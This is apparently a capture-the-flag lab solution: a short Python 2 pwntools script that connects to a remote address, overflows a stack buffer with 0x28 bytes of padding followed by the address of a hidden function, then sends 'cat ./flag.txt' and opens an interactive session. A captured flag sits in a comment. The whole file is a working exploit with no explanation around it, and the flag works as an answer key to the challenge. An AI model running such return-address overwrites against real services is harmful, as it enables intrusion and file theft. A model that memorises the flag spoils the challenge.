#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{YodbgBUFJp6ypXRqkKjI}

context.arch = 'amd64'

e = ELF('./lab1')

host , port = '35.194.234.201' , 2111

y = remote( host , port )

l33t = 0x400646

y.sendafter( ':' , 'Y' * 0x28 + p64( l33t ) )

sleep( 0.7 )

y.sendline( 'cat ./flag.txt' )

y.interactive()

